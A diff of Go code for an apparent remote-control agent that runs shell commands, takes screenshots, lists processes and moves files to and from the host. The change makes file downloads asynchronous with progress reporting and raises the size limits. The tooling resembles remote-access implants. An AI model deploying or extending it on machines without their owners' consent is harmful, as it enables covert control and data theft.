@@ -1,10 +1,12 @@
 package agent
 
 import (
+	"bytes"
 	"context"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io"
 	"os"
 	"os/exec"
 	"runtime"
@@ -17,9 +19,11 @@ import (
 )
 
 const (
-	shellTimeout        = 60 * time.Second
-	maxShellOutputBytes = 512 * 1024       // 512 KB
-	maxDownloadBytes    = 16 * 1024 * 1024 // 16 MB
+	shellTimeout          = 60 * time.Second
+	maxShellOutputBytes   = 512 * 1024       // 512 KB
+	maxDownloadBytes      = 50 * 1024 * 1024 // 50 MB
+	maxUploadBytes        = 50 * 1024 * 1024 // 50 MB
+	downloadProgressEvery = 30 * time.Second
 )
 
 // ptyShell is the persistent shell session used during interactive mode.
@@ -39,7 +43,7 @@ func executeTask(t *protocol.Task) *protocol.TaskResult {
 			output, taskErr = runShell(t.Payload)
 		}
 	case "download":
-		output, taskErr = downloadFile(t.Payload)
+		return startDownloadTask(t.ID, t.Payload)
 	case "ps":
 		output, taskErr = listProcesses()
 	case "screenshot":
@@ -118,21 +122,94 @@ func runShell(cmd string) (string, string) {
 	return string(out), ""
 }
 
-// downloadFile reads a file from the agent filesystem and returns its base64-encoded contents.
-// Files larger than maxDownloadBytes are rejected to prevent memory exhaustion.
+func startDownloadTask(taskID, path string) *protocol.TaskResult {
+	atomic.AddInt32(&backgroundTaskCount, 1)
+	ctx, cancel := context.WithCancel(context.Background())
+	backgroundTasks.Store(taskID, cancel)
+	go func() {
+		defer backgroundTasks.Delete(taskID)
+		defer atomic.AddInt32(&backgroundTaskCount, -1)
+		output, taskErr := downloadFileWithProgress(ctx, path, func(message string) {
+			queueAsyncTypedProgress(taskID, "download_progress", "download", message)
+		})
+		queueAsyncResult(&protocol.TaskResult{TaskID: taskID, Type: "download", Output: output, Error: taskErr})
+	}()
+
+	return &protocol.TaskResult{
+		TaskID: taskID + "-download-started",
+		Type:   "download_progress",
+		Output: "[download] reading " + path,
+	}
+}
+
 func downloadFile(path string) (string, string) {
+	return downloadFileWithProgress(context.Background(), path, nil)
+}
+
+// downloadFileWithProgress reads a file from the agent filesystem and returns
+// its base64-encoded contents. Files larger than maxDownloadBytes are rejected
+// to prevent memory exhaustion.
+func downloadFileWithProgress(ctx context.Context, path string, progress func(string)) (string, string) {
 	info, err := os.Stat(path)
 	if err != nil {
 		return "", err.Error()
 	}
+	if info.IsDir() {
+		return "", "is a directory"
+	}
 	if info.Size() > maxDownloadBytes {
 		return "", fmt.Sprintf("file too large: %d bytes (max %d)", info.Size(), maxDownloadBytes)
 	}
-	data, err := os.ReadFile(path)
+	file, err := os.Open(path)
 	if err != nil {
 		return "", err.Error()
 	}
-	return base64.StdEncoding.EncodeToString(data), ""
+	defer file.Close() //nolint:errcheck
+
+	var buf bytes.Buffer
+	if info.Size() > 0 {
+		buf.Grow(int(info.Size()))
+	}
+	tmp := make([]byte, 256*1024)
+	var read int64
+	lastProgress := time.Now()
+	for {
+		if err := ctx.Err(); err != nil {
+			return "", "download cancelled"
+		}
+		n, err := file.Read(tmp)
+		if n > 0 {
+			read += int64(n)
+			buf.Write(tmp[:n]) //nolint:errcheck
+			if progress != nil && time.Since(lastProgress) >= downloadProgressEvery {
+				progress(fmt.Sprintf("[download] read %s of %s from %s", formatByteCount(read), formatByteCount(info.Size()), path))
+				lastProgress = time.Now()
+			}
+		}
+		if err == io.EOF {
+			break
+		}
+		if err != nil {
+			return "", err.Error()
+		}
+	}
+	if progress != nil {
+		progress(fmt.Sprintf("[download] read complete: %s from %s", formatByteCount(read), path))
+	}
+	return base64.StdEncoding.EncodeToString(buf.Bytes()), ""
+}
+
+func formatByteCount(value int64) string {
+	const unit = 1024
+	if value < unit {
+		return fmt.Sprintf("%d B", value)
+	}
+	div, exp := int64(unit), 0
+	for n := value / unit; n >= unit && exp < 4; n /= unit {
+		div *= unit
+		exp++
+	}
+	return fmt.Sprintf("%.1f %cB", float64(value)/float64(div), "KMGTPE"[exp])
 }
 
 func completePath(input string) (string, string) {
@@ -225,9 +302,15 @@ func uploadFile(payload string) (string, string) {
 	}
 	path := payload[:idx]
 	b64data := payload[idx+1:]
+	if len(b64data) > base64.StdEncoding.EncodedLen(maxUploadBytes) {
+		return "", fmt.Sprintf("upload data too large: max %d bytes", maxUploadBytes)
+	}
 	data, err := base64.StdEncoding.DecodeString(b64data)
 	if err != nil {
 		return "", fmt.Sprintf("base64 decode failed: %v", err)
+	}
+	if len(data) > maxUploadBytes {
+		return "", fmt.Sprintf("upload data too large: %d bytes (max %d)", len(data), maxUploadBytes)
 	}
 	if err := os.WriteFile(path, data, 0600); err != nil {
 		return "", err.Error()
